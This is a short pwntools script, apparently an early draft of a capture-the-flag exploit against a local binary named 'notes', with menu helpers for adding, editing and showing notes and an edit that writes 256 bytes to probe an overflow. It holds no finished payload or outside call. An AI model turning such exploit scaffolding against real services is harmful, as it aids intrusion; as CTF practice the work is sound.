from pwn import *

elf = context.binary = ELF('notes', checksec=False)
# libc = ELF('libc-2.27.so')
libc =elf.libc
context.log_level = 'debug'

io = elf.process()
# io =remote()

def add(idx, content):
    io.sendlineafter(b"0. Exit\n", b'1')
    io.sendlineafter(b"index> \n", str(idx))
    io.sendlineafter(b"content> \n", content)

def edit(idx, content):
    io.sendlineafter(b"0. Exit\n", b'2')
    io.sendlineafter(b"index> \n", str(idx))
    io.sendlineafter(b"content> \n", content)


def show():
    io.sendlineafter(b"0. Exit\n", b'3')
    

# -------------------------------------------------------

add(0, b"aaaaaaaa")
add(1, b"bbbbbbbb")
pause()
show()
# pause()
edit(0, b"c"*256)
show()

io.interactive()